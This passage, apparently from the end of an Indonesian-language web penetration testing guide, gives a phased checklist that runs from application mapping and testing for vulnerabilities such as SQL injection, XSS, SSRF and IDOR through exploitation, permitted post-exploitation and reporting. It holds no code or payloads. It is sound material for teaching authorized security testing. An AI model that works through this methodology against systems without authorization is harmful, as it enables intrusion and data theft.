  
Phase 2: Application Mapping
  □ Eksplorasi manual (buat akun, jelajahi)
  □ Analisis traffic dengan Burp Suite
  □ Content discovery (ffuf/feroxbuster)
  □ Analisis JavaScript
  □ Penemuan endpoint API
  
Phase 3: Vulnerability Discovery
  □ Pengujian autentikasi (SQLi, bypass, default creds)
  □ Session management
  □ Otorisasi (IDOR, privilege escalation)
  □ SQL injection (semua parameter)
  □ XSS (reflected, stored, DOM)
  □ Command injection
  □ XXE
  □ SSRF
  □ LFI/RFI
  □ Bug logic bisnis
  □ Kerentanan file upload
  □ Security misconfiguration
  □ Kerentanan spesifik API
  
Phase 4: Exploitation
  □ Buat PoC untuk setiap temuan
  □ Dokumentasikan langkah dengan jelas
  □ Kumpulkan bukti
  □ Tunjukkan dampak
  
Phase 5: Post-Exploitation (jika diizinkan)
  □ Privilege escalation
  □ Assessment pergerakan lateral
  □ Data exfiltration minimal untuk PoC
  
Phase 6: Documentation
  □ Laporan detail setiap kerentanan
  □ Executive summary
  □ Rekomendasi remediasi
  □ Presentasi profesional
```

---

**Ini adalah metodologi yang sudah teruji dan digunakan oleh pentester profesional. Ikuti secara sistematis, dokumentasikan semuanya, dan bug akan muncul sendiri.**

**Selamat berburu! 🎯**
